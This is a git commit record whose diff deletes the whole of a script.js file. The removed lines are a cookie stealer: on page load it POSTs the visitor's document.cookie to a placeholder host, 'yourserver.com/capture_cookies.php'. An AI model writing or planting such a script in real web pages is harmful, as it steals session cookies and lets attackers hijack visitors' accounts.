a1a264ec152cfa10dac7d4d4796f7f1aacb300f5
shadow45921 <zealdem@gmail.com>
2025-07-10 11:10:35 -0400

    Update and rename script.js to noting 1

--- script.js
+++
@@ -1,9 +0,0 @@
-document.addEventListener('DOMContentLoaded', function() {
-    fetch('http://yourserver.com/capture_cookies.php', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ cookies: document.cookie })
-    });
-});
